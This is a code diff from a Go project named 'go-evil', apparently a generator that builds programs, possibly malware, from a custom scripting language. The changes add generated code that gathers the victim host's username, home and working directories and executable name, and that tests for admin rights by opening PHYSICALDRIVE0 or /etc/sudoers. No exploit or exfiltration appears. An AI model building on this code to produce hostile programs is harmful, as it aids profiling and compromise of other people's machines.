@@ -1,6 +1,10 @@
 package parsing
 
-import "github.com/TeamPhoneix/go-evil/utility/structure"
+import (
+	"regexp"
+
+	"github.com/TeamPhoneix/go-evil/utility/structure"
+)
 
 //
 //
@@ -33,36 +37,45 @@ func generate_runtime_variable(s_json string) string {
 		"toReturn := line",
 
 		"if len(result) > 0 {",
-
-		"i_number := tools.String_to_int(result[0][2])",
+		"for _, value := range result {",
+		"i_number := tools.String_to_int(value[2])",
+		"grabbed_value := \"NULL\"",
 		"if i_number != -1 {",
 		"if i_number > 0 && i_number < 5 {",
-		"toReturn = obj.values[i_number-1]",
+		"grabbed_value = obj.values[i_number-1]",
 		"} else {",
-		"switch (i_number){",
+		"switch i_number {",
 
 		"case 13:",
-		"toReturn = obj.foreach",
+		"grabbed_value = obj.foreach",
 
-		"case 666:",
-		"toReturn = tools.Grab_username()",
+		"case 23:",
+		"grabbed_value = tools.Grab_executable_name()",
 
 		"case 39:",
-		"toReturn = tools.Grab_CWD()",
+		"grabbed_value = tools.Grab_CWD()",
 
 		"case 40:",
-		"toReturn = tools.Grab_home_dir()",
+		"grabbed_value = tools.Grab_home_dir()",
+
+		"case 666:",
+		"grabbed_value = tools.Grab_username()",
 
 		"default:",
-		"toReturn = \"NULL\"",
+		"notify.Log(fmt.Sprintf(\"Error, unknown value '%d'\", i_number), spine.logging, \"3\")",
 
-		"}}",
-
-		"toReturn = strings.ReplaceAll(line, result[0][1], toReturn)",
-		"}}",
-		"return toReturn }"})
+		"}",
+		"}",
+		"line = strings.ReplaceAll(line, value[1], grabbed_value)",
+		"}",
+		"}",
+		"toReturn = line",
+		"}",
+		"return toReturn",
+		"}"})
 
 	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")
+	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")
 	data_object.Add_go_import("regexp")
 	data_object.Add_go_import("strings")
 
@@ -160,9 +173,60 @@ func generate_spine(s_json string) string {
 		"path string",
 		"alpha alpha_t",
 		"logging string",
+		"is_admin bool",
 		"}"})
+
+	body := []string{"func (obj *spine_t) check_privileges(){"}
+
+	if data_object.Target_os == "windows" {
+		body = append(body, "_, err := os.Open(\"\\\\.\\\\PHYSICALDRIVE0\")")
+	} else {
+		body = append(body, "_, err := os.Open(\"/etc/sudoers\")")
+	}
+
+	body = append(body, "if err != nil{", "obj.is_admin = false", "}else{", "obj.is_admin = true", "}", "}")
+
+	data_object.Add_go_function(body)
 
 	data_object.Add_go_global("var spine spine_t")
 	return structure.Send(data_object)
 
+}
+
+//
+//
+// Parses the data from the target file and generates function structures from it
+//
+//
+func Build_functions_structs(s_json string) string {
+	data_object := structure.Receive(s_json)
+	regex := regexp.MustCompile(FUNC)
+	functions := regex.FindAllStringSubmatch(data_object.File_gut, -1)
+
+	if len(functions) > 0 {
+		for _, function := range functions {
+			f_type := function[1]
+			name := function[2]
+			gut := function[3:]
+
+			data_object.Add_function(name, f_type, gut)
+
+		}
+	}
+	return structure.Send(data_object)
+}
+
+//
+//
+// Generate differebnt structs
+//
+//
+func generate_structs(s_json string) string {
+	s_json = generate_runtime_variable(s_json)
+	s_json = generate_crypt(s_json)
+	s_json = generate_alpha(s_json)
+
+	s_json = generate_spine(s_json)
+
+	return s_json
 }
